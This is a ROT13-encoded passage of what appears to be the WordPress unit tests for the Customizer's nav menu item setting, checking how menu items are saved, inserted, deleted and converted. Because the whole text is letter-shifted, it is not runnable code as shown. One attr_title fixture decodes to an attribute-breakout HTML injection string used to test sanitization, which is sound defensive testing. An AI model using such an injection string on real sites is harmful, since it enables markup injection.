					'zrah-vgrz-gvgyr'       => $hafnavgvmrq['gvgyr'],
					'zrah-vgrz-hey'         => $hafnavgvmrq['hey'],
					'zrah-vgrz-qrfpevcgvba' => $hafnavgvmrq['qrfpevcgvba'],
					'zrah-vgrz-ngge-gvgyr'  => $hafnavgvmrq['ngge_gvgyr'],
					'zrah-vgrz-gnetrg'      => $hafnavgvmrq['gnetrg'],
					'zrah-vgrz-pynffrf'     => $hafnavgvmrq['pynffrf'],
					'zrah-vgrz-ksa'         => $hafnavgvmrq['ksa'],
					'zrah-vgrz-fgnghf'      => $hafnavgvmrq['fgnghf'],
				)
			)
		);

		$cbfg          = trg_cbfg( $ani_zrah_vgrz_vq );
		$ani_zrah_vgrz = jc_frghc_ani_zrah_vgrz( pybar $cbfg );

		$guvf->nffregRdhnyf( $rkcrpgrq_fnavgvmrq['bowrpg_vq'], $ani_zrah_vgrz->bowrpg_vq );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['bowrpg'], $ani_zrah_vgrz->bowrpg );
		$guvf->nffregRdhnyf( $rkcrpgrq_fnavgvmrq['zrah_vgrz_cnerag'], $ani_zrah_vgrz->zrah_vgrz_cnerag );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['cbfvgvba'], $cbfg->zrah_beqre );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['glcr'], $ani_zrah_vgrz->glcr );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['hey'], $ani_zrah_vgrz->hey );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['qrfpevcgvba'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['ngge_gvgyr'], $cbfg->cbfg_rkprecg );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['gnetrg'], $ani_zrah_vgrz->gnetrg );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['pynffrf'], vzcybqr( ' ', $ani_zrah_vgrz->pynffrf ) );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['ksa'], $ani_zrah_vgrz->ksa );
		$guvf->nffregFnzr( $rkcrpgrq_fnavgvmrq['fgnghf'], $cbfg->cbfg_fgnghf );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe hcqngrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_hcqngrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$svefg_cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$frpbaq_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Ubyn Zhab' ) );

		$cevznel_zrah_vq   = jc_perngr_ani_zrah( 'Cevznel' );
		$frpbaqnel_zrah_vq = jc_perngr_ani_zrah( 'Frpbaqnel' );
		$vgrz_gvgyr        = 'Terrgvatf';
		$vgrz_vq           = jc_hcqngr_ani_zrah_vgrz(
			$cevznel_zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $svefg_cbfg_vq,
				'zrah-vgrz-gvgyr'     => $vgrz_gvgyr,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		$guvf->nffregAbgRzcgl( jc_trg_ani_zrah_vgrzf( $cevznel_zrah_vq, neenl( 'cbfg_fgnghf' => 'choyvfu,qensg' ) ) );

		$cbfg_inyhr = neenl(
			'glcr'             => 'cbfg_glcr',
			'bowrpg'           => 'cbfg',
			'bowrpg_vq'        => $frpbaq_cbfg_vq,
			'gvgyr'            => 'Fnyhqbf \b/ b\'b',
			'fgnghf'           => 'choyvfu',
			'ani_zrah_grez_vq' => $frpbaqnel_zrah_vq,
		);
		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $cbfg_inyhr );
		hafrg( $cbfg_inyhr['ani_zrah_grez_vq'] );
		$frggvat->fnir();

		// Znxr fher gur zrah vgrz nccrnef va gur arj zrah.
		$guvf->nffregAbgPbagnvaf( $vgrz_vq, jc_yvfg_cyhpx( jc_trg_ani_zrah_vgrzf( $cevznel_zrah_vq ), 'qo_vq' ) );
		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $frpbaqnel_zrah_vq );
		$qo_vqf     = jc_yvfg_cyhpx( $zrah_vgrzf, 'qo_vq' );
		$guvf->nffregPbagnvaf( $vgrz_vq, $qo_vqf );
		$v                         = neenl_frnepu( $vgrz_vq, $qo_vqf, gehr );
		$hcqngrq_vgrz              = $zrah_vgrzf[ $v ];
		$cbfg_inyhr['cbfg_fgnghf'] = $cbfg_inyhr['fgnghf'];
		hafrg( $cbfg_inyhr['fgnghf'] );
		sbernpu ( $cbfg_inyhr nf $xrl => $inyhr ) {
			$guvf->nffregRdhnyf( $inyhr, $hcqngrq_vgrz->$xrl, \"Xrl $xrl zvfzngpu\" );
		}

		// Irevsl gur Nwnk erfcbafrf vf orvat nzraqrq.
		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_vgrz_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_vgrz_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );

		$guvf->nffregFnzr( $vgrz_vq, $hcqngr_erfhyg['cbfg_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['cerivbhf_cbfg_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'hcqngrq', $hcqngr_erfhyg['fgnghf'] );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe vafregrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_vafregrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq  = jc_perngr_ani_zrah( 'Cevznel' );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vqf = neenl();
		sbe ( $v = 0; $v < 5; $v += 1 ) {
			$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
				$zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'cbfg_glcr',
					'zrah-vgrz-bowrpg'    => 'cbfg',
					'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
					'zrah-vgrz-gvgyr'     => \"Vgrz $v\",
					'zrah-vgrz-fgnghf'    => 'choyvfu',
					'zrah-vgrz-cbfvgvba'  => $v + 1,
				)
			);
			$vgrz_vqf[] = $vgrz_vq;
		}

		$cbfg_inyhr = neenl(
			'glcr'             => 'cbfg_glcr',
			'bowrpg'           => 'cbfg',
			'bowrpg_vq'        => $cbfg_vq,
			'gvgyr'            => 'Vafregrq vgrz',
			'fgnghf'           => 'choyvfu',
			'ani_zrah_grez_vq' => $zrah_vq,
			'cbfvgvba'         => pbhag( $vgrz_vqf ) + 1,
		);

		$arj_vgrz_vq = -10;
		$frggvat_vq  = \"ani_zrah_vgrz[$arj_vgrz_vq]\";
		$frggvat     = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $cbfg_inyhr );
		hafrg( $cbfg_inyhr['ani_zrah_grez_vq'] );

		$pheerag_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$frggvat->fnir();
		$cerivrj_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregAbgRdhnyf( pbhag( $pheerag_vgrzf ), pbhag( $cerivrj_vgrzf ) );

		$ynfg_vgrz = neenl_cbc( $cerivrj_vgrzf );
		$guvf->nffregFnzr( $frggvat->cbfg_vq, $ynfg_vgrz->qo_vq );
		$cbfg_inyhr['cbfg_fgnghf'] = $cbfg_inyhr['fgnghf'];
		hafrg( $cbfg_inyhr['fgnghf'] );
		$cbfg_inyhr['zrah_beqre'] = $cbfg_inyhr['cbfvgvba'];
		hafrg( $cbfg_inyhr['cbfvgvba'] );
		sbernpu ( $cbfg_inyhr nf $xrl => $inyhr ) {
			$guvf->nffregRdhnyf( $inyhr, $ynfg_vgrz->$xrl, \"Zvfzngpu sbe $xrl cebcregl.\" );
		}

		// Irevsl gur Nwnk erfcbafrf vf orvat nzraqrq.
		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_vgrz_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_vgrz_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );

		$guvf->nffregFnzr( $frggvat->cbfg_vq, $hcqngr_erfhyg['cbfg_vq'] );
		$guvf->nffregFnzr( $arj_vgrz_vq, $hcqngr_erfhyg['cerivbhf_cbfg_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'vafregrq', $hcqngr_erfhyg['fgnghf'] );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe qryrgrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_qryrgrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq  = jc_perngr_ani_zrah( 'Cevznel' );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vqf = neenl();
		sbe ( $v = 0; $v < 5; $v += 1 ) {
			$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
				$zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'cbfg_glcr',
					'zrah-vgrz-bowrpg'    => 'cbfg',
					'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
					'zrah-vgrz-gvgyr'     => \"Vgrz $v\",
					'zrah-vgrz-fgnghf'    => 'choyvfu',
					'zrah-vgrz-cbfvgvba'  => $v + 1,
				)
			);
			$vgrz_vqf[] = $vgrz_vq;
		}

		$qryrgr_vgrz_vq = $vgrz_vqf[2];
		$frggvat_vq     = \"ani_zrah_vgrz[$qryrgr_vgrz_vq]\";
		$frggvat        = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, snyfr );

		$pheerag_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregPbagnvaf( $qryrgr_vgrz_vq, jc_yvfg_cyhpx( $pheerag_vgrzf, 'qo_vq' ) );
		$frggvat->fnir();
		$cerivrj_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregAbgRdhnyf( pbhag( $pheerag_vgrzf ), pbhag( $cerivrj_vgrzf ) );
		$guvf->nffregPbagnvaf( $qryrgr_vgrz_vq, jc_yvfg_cyhpx( $pheerag_vgrzf, 'qo_vq' ) );

		// Irevsl gur Nwnk erfcbafrf vf orvat nzraqrq.
		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_vgrz_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_vgrz_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_cbfg_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );

		$guvf->nffregFnzr( $qryrgr_vgrz_vq, $hcqngr_erfhyg['cbfg_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['cerivbhf_cbfg_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'qryrgrq', $hcqngr_erfhyg['fgnghf'] );
	}

	/**
	 * @gvpxrg 33665
	 */
	choyvp shapgvba grfg_vainyvq_ani_zrah_vgrz() {
		$zrah_vq = jc_perngr_ani_zrah( 'Cevznel' );
		ertvfgre_cbfg_glcr(
			'cbrz',
			neenl(
				'choyvp' => gehr,
			)
		);

		$cbfg_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cbrz',
				'cbfg_gvgyr' => 'Pbqr vf cbrgel.',
			)
		);
		$cbfg       = trg_cbfg( $cbfg_vq );
		$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbrz',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-gvgyr'     => $cbfg->cbfg_gvgyr,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-cbfvgvba'  => 1,
			)
		);
		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";

		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$frggvat = $guvf->jc_phfgbzvmr->trg_frggvat( $frggvat_vq );
		$guvf->nffregAbgRzcgl( $frggvat );
		$inyhr = $frggvat->inyhr();
		$guvf->nffregSnyfr( $inyhr['_vainyvq'] );
		$inyhr_bowrpg = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregSnyfr( $inyhr_bowrpg->_vainyvq );

		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$inyhr   = $frggvat->inyhr();
		$guvf->nffregSnyfr( $inyhr['_vainyvq'] );
		$inyhr_bowrpg = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregSnyfr( $inyhr_bowrpg->_vainyvq );

		_haertvfgre_cbfg_glcr( 'cbrz' );
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$inyhr   = $frggvat->inyhr();
		$guvf->nffregGehr( $inyhr['_vainyvq'] );
		$inyhr_bowrpg = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregGehr( $inyhr_bowrpg->_vainyvq );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz().
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz()
	 */
	choyvp shapgvba grfg_inyhr_nf_jc_cbfg_ani_zrah_vgrz() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[123]'
		);
		$cbfg_inyhr = neenl(
			'bowrpg_vq'        => $cbfg_vq,
			'bowrpg'           => 'cbfg',
			'zrah_vgrz_cnerag' => 0,
			'cbfvgvba'         => 2,
			'glcr'             => 'phfgbz_glcr',
			'gvgyr'            => 'Uryyb \b/ b\'b Jbeyq',
			'hey'              => '',
			'gnetrg'           => '',
			'ngge_gvgyr'       => '\">ngg \b/ b\'b rzcgrq <o>onqqvr</o>',
			'qrfpevcgvba'      => 'Nggrzcgrq \b/ b\'b <o>znexhc</o>',
			'pynffrf'          => 'pynff-1 pynff-2',
			'ksa'              => '',
			'fgnghf'           => 'choyvfu',
			'bevtvany_gvgyr'   => '',
			'ani_zrah_grez_vq' => 0,
			'_vainyvq'         => snyfr,
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat->vq, $cbfg_inyhr );

		$frggvat->cerivrj();

		$vgrz_inyhr = $frggvat->inyhr();
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( 'Phfgbz Yvax', $ani_zrah_vgrz->glcr_ynory );
		$guvf->nffregFnzr( $vgrz_inyhr['glcr_ynory'], $ani_zrah_vgrz->glcr_ynory );
		nqq_svygre( 'jc_frghc_ani_zrah_vgrz', neenl( $guvf, 'svygre_glcr_ynory' ) );
		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( 'Phfgbz Ynory', $ani_zrah_vgrz->glcr_ynory );

		$guvf->nffregBowrpgAbgUnfCebcregl( 'ani_zrah_grez_vq', $ani_zrah_vgrz );
		$guvf->nffregBowrpgAbgUnfCebcregl( 'fgnghf', $ani_zrah_vgrz );
		$guvf->nffregFnzr( 'choyvfu', $ani_zrah_vgrz->cbfg_fgnghf );
		$guvf->nffregFnzr( 'ani_zrah_vgrz', $ani_zrah_vgrz->cbfg_glcr );
		$guvf->nffregBowrpgAbgUnfCebcregl( 'cbfvgvba', $ani_zrah_vgrz );
		$guvf->nffregFnzr( $cbfg_inyhr['cbfvgvba'], $ani_zrah_vgrz->zrah_beqre );
		$guvf->nffregFnzr( $cbfg_inyhr['gvgyr'], $ani_zrah_vgrz->cbfg_gvgyr );
		$guvf->nffregFnzr( 123, $ani_zrah_vgrz->VQ );
		$guvf->nffregFnzr( 123, $ani_zrah_vgrz->qo_vq );
		$guvf->nffregFnzr( jc_trg_pheerag_hfre()->VQ, $ani_zrah_vgrz->cbfg_nhgube );
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $ani_zrah_vgrz );
		$rkcrpgrq = nccyl_svygref( 'ani_zrah_ngge_gvgyr', jc_hafynfu( nccyl_svygref( 'rkprecg_fnir_cer', jc_fynfu( $cbfg_inyhr['ngge_gvgyr'] ) ) ) );
		$guvf->nffregFnzr( $rkcrpgrq, $ani_zrah_vgrz->ngge_gvgyr );
		$guvf->nffregFnzr( 'Nggrzcgrq \b/ b&#8217;b znexhc', $ani_zrah_vgrz->qrfpevcgvba );
		$guvf->nffregFnzr( neenl( 'pynff-1', 'pynff-2' ), $ani_zrah_vgrz->pynffrf );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz() gb frg hey sbe cbfgf, grezf, naq cbfg glcr nepuvirf.
	 *
	 * @gvpxrg 38945
	 * @pbiref JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz
	 */
	choyvp shapgvba grfg_inyhr_nf_jc_cbfg_ani_zrah_vgrz_grez_heyf() {
		$grez_vq = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'pngrtbel' ) );
		ertvfgre_cbfg_glcr(
			'cerff_eryrnfr',
			neenl(
				'unf_nepuvir' => gehr,
			)
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cerff_eryrnfr' ) );

		// Grez.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-1]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'glcr'      => 'gnkbabzl',
				'bowrpg'    => 'pngrtbel',
				'bowrpg_vq' => $grez_vq,
				'gvgyr'     => 'Pngrtbel',
				'hey'       => '',
			)
		);
		$frggvat->cerivrj();
		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( trg_grez_yvax( $grez_vq ), $ani_zrah_vgrz->hey );

		// Cbfg.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-2]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'glcr'      => 'cbfg_glcr',
				'bowrpg'    => 'cerff_eryrnfr',
				'bowrpg_vq' => $cbfg_vq,
				'gvgyr'     => 'CE',
				'hey'       => '',
			)
		);
		$frggvat->cerivrj();
		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( trg_creznyvax( $cbfg_vq ), $ani_zrah_vgrz->hey );

		// Cbfg glcr nepuvir.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-3]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'glcr'   => 'cbfg_glcr_nepuvir',
				'bowrpg' => 'cerff_eryrnfr',
				'gvgyr'  => 'CE',
				'hey'    => '',
			)
		);
		$frggvat->cerivrj();
		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( trg_cbfg_glcr_nepuvir_yvax( 'cerff_eryrnfr' ), $ani_zrah_vgrz->hey );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz() sbe bognvavat bevtvany gvgyr.
	 *
	 * @gvpxrg 38945
	 * @pbiref JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::trg_bevtvany_gvgyr
	 */
	choyvp shapgvba grfg_trg_bevtvany_gvgyr() {
		$zrah_vq = jc_perngr_ani_zrah( 'Zrah' );
		ertvfgre_cbfg_glcr(
			'cerff_eryrnfr',
			neenl(
				'unf_nepuvir' => gehr,
				'ynoryf'      => neenl(
					'anzr'          => 'CEf',
					'fvathyne_anzr' => 'CE',
					'nepuvirf'      => 'Nyy CEf',
				),
			)
		);
		$bevtvany_cbfg_gvgyr = 'Gur CE Cbfg';
		$cbfg_vq             = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cerff_eryrnfr',
				'cbfg_gvgyr' => $bevtvany_cbfg_gvgyr,
			)
		);
		$bevtvany_grez_gvgyr = 'Gur Pngrtbel Grez';
		$grez_vq             = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => $bevtvany_grez_gvgyr,
			)
		);

		// Cbfg: rkvfgvat ani zrah vgrz.
		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cerff_eryrnfr',
				'zrah-vgrz-gvgyr'     => '',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		$frggvat          = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[' . $ani_zrah_vgrz_vq . ']'
		);
		$vgrz_inyhr       = $frggvat->inyhr();
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->fvathyne_anzr, $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );

		// Cbfg: fgntrq ani zrah vgrz.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-1]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'bowrpg_vq' => $cbfg_vq,
				'glcr'      => 'cbfg_glcr',
				'bowrpg'    => 'cerff_eryrnfr',
				'gvgyr'     => '',
				'fgnghf'    => 'choyvfu',
			)
		);
		$frggvat->cerivrj();
		$vgrz_inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( $bevtvany_cbfg_gvgyr, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->fvathyne_anzr, $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );

		// Grez: rkvfgvat ani zrah vgrz.
		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-bowrpg-vq' => $grez_vq,
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-gvgyr'     => '',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		$frggvat          = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[' . $ani_zrah_vgrz_vq . ']'
		);
		$vgrz_inyhr       = $frggvat->inyhr();
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( trg_gnkbabzl( 'pngrtbel' )->ynoryf->fvathyne_anzr, $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );

		// Grez: fgntrq ani zrah vgrz.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-2]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'bowrpg_vq' => $grez_vq,
				'glcr'      => 'gnkbabzl',
				'bowrpg'    => 'pngrtbel',
				'gvgyr'     => '',
				'fgnghf'    => 'choyvfu',
			)
		);
		$frggvat->cerivrj();
		$vgrz_inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
